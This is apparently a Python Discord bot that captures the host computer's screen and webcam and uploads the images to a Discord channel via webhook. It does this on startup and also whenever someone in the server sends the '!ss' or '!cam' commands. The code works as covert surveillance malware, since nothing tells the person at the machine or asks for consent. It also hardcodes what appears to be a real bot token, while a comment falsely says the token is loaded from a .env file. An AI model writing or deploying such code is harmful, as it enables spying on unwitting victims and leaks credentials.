import discord
from discord.ext import commands
import pyautogui
import cv2
from io import BytesIO
from PIL import Image
import os
from dotenv import load_dotenv

# Load the bot token securely from the .env file
load_dotenv()
TOKEN = "MTMzMzc3MTUyNTcxOTA2NDYwNg.Gkq3Xt.9LShNd_6QDTgVgAx_GD5ce6rn_pGaw20urrFlM"

if not TOKEN:
    raise ValueError("Bot token is missing! Check your .env file.")

# Replace with your actual server ID
YOUR_SERVER_ID = 123456789012345678  # Replace with your actual server ID

# Initialize the bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

async def get_or_create_upload_channel(guild, user):
    """Ensure a single image upload channel exists with the user's name."""
    channel_name = f"image-uploads-{user.name}"
    existing_channel = discord.utils.get(guild.channels, name=channel_name)

    if existing_channel:
        return existing_channel

    try:
        new_channel = await guild.create_text_channel(channel_name)
        print(f"Created new channel: {new_channel.name}")
        return new_channel
    except Exception as e:
        print(f"Error creating channel: {e}")
        return None

async def get_or_create_webhook(channel):
    """Ensure a webhook exists for the image upload channel."""
    webhooks = await channel.webhooks()
    if webhooks:
        return webhooks[0]  # Use the first webhook found

    try:
        webhook = await channel.create_webhook(name="ImageUploader")
        print(f"Created webhook: {webhook.url}")
        return webhook
    except Exception as e:
        print(f"Error creating webhook: {e}")
        return None

def take_screenshot():
    """Capture a screenshot."""
    try:
        return pyautogui.screenshot()
    except Exception as e:
        print(f"Error taking screenshot: {e}")
        return None

def capture_webcam_image():
    """Capture an image from the webcam."""
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # Use DirectShow for Windows

        if not cap.isOpened():
            print("Could not access the webcam.")
            return None

        import time
        time.sleep(2)  # Allow camera to adjust

        ret, frame = cap.read()
        cap.release()  # Release the webcam (no cv2.destroyAllWindows())

        if not ret:
            print("Failed to capture an image.")
            return None

        return Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
    except Exception as e:
        print(f"Error capturing webcam image: {e}")
        return None


async def send_image_via_webhook(webhook, image, filename):
    """Send an image using the webhook."""
    try:
        with BytesIO() as image_binary:
            image.save(image_binary, format="PNG")
            image_binary.seek(0)
            file = discord.File(fp=image_binary, filename=filename)
            await webhook.send(username="ImageBot", file=file)
        print(f"{filename} sent via webhook")
    except Exception as e:
        print(f"Error sending image via webhook: {e}")

@bot.event
async def on_ready():
    print(f"Bot is ready. Logged in as {bot.user}")

    # Find the correct server (guild)
    target_guild = None
    for guild in bot.guilds:
        if guild.id == YOUR_SERVER_ID:
            target_guild = guild
            break

    if target_guild is None:
        print("Bot is not in the correct server. Exiting...")
        await bot.close()
        return

    print(f"Connected to {target_guild.name}")

    # Ensure the upload channel exists with the user's name
    # Here we just use the bot user, you can change this to use another user
    image_channel = await get_or_create_upload_channel(target_guild, bot.user)
    if not image_channel:
        print("Failed to access the image upload channel.")
        return

    webhook = await get_or_create_webhook(image_channel)
    if not webhook:
        print("Failed to create a webhook.")
        return

    # Take and send screenshot
    screenshot_image = take_screenshot()
    if screenshot_image:
        await send_image_via_webhook(webhook, screenshot_image, "screenshot.png")

    # Capture and send webcam image
    webcam_image = capture_webcam_image()
    if webcam_image:
        await send_image_via_webhook(webhook, webcam_image, "webcam.png")

@bot.command(name="ss")
async def screenshot(ctx):
    """Take a screenshot and upload it via webhook."""
    image_channel = await get_or_create_upload_channel(ctx.guild, ctx.author)
    if not image_channel:
        await ctx.send("Failed to access the image upload channel.")
        return

    webhook = await get_or_create_webhook(image_channel)
    if not webhook:
        await ctx.send("Failed to create a webhook.")
        return

    screenshot_image = take_screenshot()
    if screenshot_image:
        await send_image_via_webhook(webhook, screenshot_image, "screenshot.png")
    else:
        await ctx.send("Screenshot failed.")

@bot.command(name="cam")
async def webcam(ctx):
    """Capture a webcam image and upload it via webhook."""
    image_channel = await get_or_create_upload_channel(ctx.guild, ctx.author)
    if not image_channel:
        await ctx.send("Failed to access the image upload channel.")
        return

    webhook = await get_or_create_webhook(image_channel)
    if not webhook:
        await ctx.send("Failed to create a webhook.")
        return

    webcam_image = capture_webcam_image()
    if webcam_image:
        await send_image_via_webhook(webhook, webcam_image, "webcam.png")
    else:
        await ctx.send("Webcam capture failed.")
@bot.event
async def on_ready():
    print(f"Bot is ready. Logged in as {bot.user}")
    print("Bot is connected to the following servers:")
    for guild in bot.guilds:
        print(f"- {guild.name} (ID: {guild.id})")

# Run the bot
bot.run(TOKEN)
